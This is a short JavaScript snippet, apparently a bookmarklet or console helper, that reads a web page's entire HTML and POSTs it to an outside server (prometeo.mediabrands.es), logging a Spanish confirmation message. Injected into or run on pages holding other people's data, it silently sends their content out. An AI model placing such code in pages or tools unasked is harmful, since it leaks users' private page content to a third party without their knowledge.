(async () => {
    const content = document.documentElement.innerHTML;
    const response = await fetch("https://prometeo.mediabrands.es/", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content })
    });
    console.log("Contenido enviado:", response.ok);
  })();
  